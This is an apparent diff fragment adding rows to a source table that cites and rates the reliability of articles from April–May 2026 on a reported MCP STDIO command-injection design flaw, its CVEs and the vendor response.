+| Cloud Security Alliance — Independent MCP Analysis | https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-by-design-rce-ox-security-20260420-csa/ | 2026-04-20 | High — independent expert validation; MAESTRO framework mapping; confirms execute-first architecture characterization |
+| The Hacker News — MCP Design Vulnerability | https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html | 2026-04-20 | High — detailed technical coverage; CVE inventory and researcher attribution; confirms Anthropic "expected behavior" response |
+| The Register — Anthropic MCP Design Flaw | https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/ | 2026-04-16 | High — first major independent coverage; confirms marketplace poisoning details and Anthropic response |
+| AuthZed — MCP Breach Timeline | https://authzed.com/blog/timeline-mcp-breaches | 2026-04 | High — comprehensive chronological timeline of MCP security incidents; contextualizes April 2026 cluster within broader MCP security history |
+| LiteLLM Security Update (four-layer fix reference) | https://docs.litellm.ai/blog/mcp-stdio-command-injection-april-2026 | 2026-04 | High — primary vendor documentation of best-practice downstream fix; four-layer approach serves as reference implementation template |
+| VentureBeat — MCP STDIO 200,000 Servers | https://venturebeat.com/security/mcp-stdio-flaw-200000-ai-agent-servers-exposed-ox-security-audit | 2026-04 | High — confirms scale figures and Anthropic "expected behavior" characterization |
+| Medium — MCP Crisis: 30 CVEs Analysis | https://medium.com/@khayyam.h/the-model-context-protocol-crisis-what-30-cves-teach-us-about-building-secure-ai-agents-95e16497d249 | 2026-05 | Medium-High — expert analysis of 30+ CVEs and systemic issues; provides context for the eight CVEs within the broader MCP security landscape |
